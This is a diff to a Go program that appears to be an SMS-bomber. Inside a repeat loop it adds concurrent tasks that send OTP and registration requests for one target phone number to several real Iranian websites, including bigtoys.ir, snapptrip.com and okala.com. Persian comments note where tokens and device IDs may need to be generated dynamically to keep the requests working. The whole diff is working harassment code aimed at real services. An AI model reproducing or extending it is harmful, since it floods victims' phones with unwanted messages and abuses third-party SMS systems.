@@ -285,6 +285,70 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
 		
 
+
+
+
+// bigtoys.ir - Variation 3 (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action_type", "phone")
+			formData.Set("digt_countrycode", "+98")
+			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
+			formData.Set("email", "")
+			formData.Set("digits_reg_name", "abcdefghl")
+			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
+			formData.Set("digits_process_register", "1")
+			formData.Set("optional_email", "")
+			formData.Set("is_digits_optional_data", "1")
+			formData.Set("sms_otp", "")
+			formData.Set("otp_step_1", "1")
+			formData.Set("signup_otp_mode", "1")
+			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
+			formData.Set("optional_data", "email")
+			formData.Set("action", "digits_forms_ajax")
+			formData.Set("type", "register")
+			formData.Set("dig_otp", "")
+			formData.Set("digits", "1")
+			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
+			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
+			formData.Set("_wp_http_referer", "/")
+			formData.Set("container", "digits_protected")
+			formData.Set("sub_action", "sms_otp")
+			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+
+		// mamifood.org - SendValidationCode (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			// توجه: پارامتر "did" در این درخواست وجود دارد و ممکن است داینامیک باشد (مانند Device ID).
+			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد یا نیاز به دریافت did جدید در هر بار دارد.
+			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
+				"Phone": phone,
+				"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791", // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
+			}, &wg, ch)
+		}
+		// platform-api.snapptrip.com - request-otp (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
+				"phoneNumber": phone,
+			}, &wg, ch)
+		}
+		// okala.com - OTPRegister (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
+				"mobile":                     phone,
+				"confirmTerms":               true,
+				"notRobot":                   false,
+				"ValidationCodeCreateReason": 5,
+				"OtpApp":                     0,
+				"IsAppOnly":                  false,
+				"deviceTypeCode":             7,
+				// سایر فیلدهای موجود در Payload اصلی را می‌توانید اینجا اضافه کنید اگر نیاز باشد
+			}, &wg, ch)
+		}
 		// see5.net (Form)
 		wg.Add(1)
 		tasks <- func() {
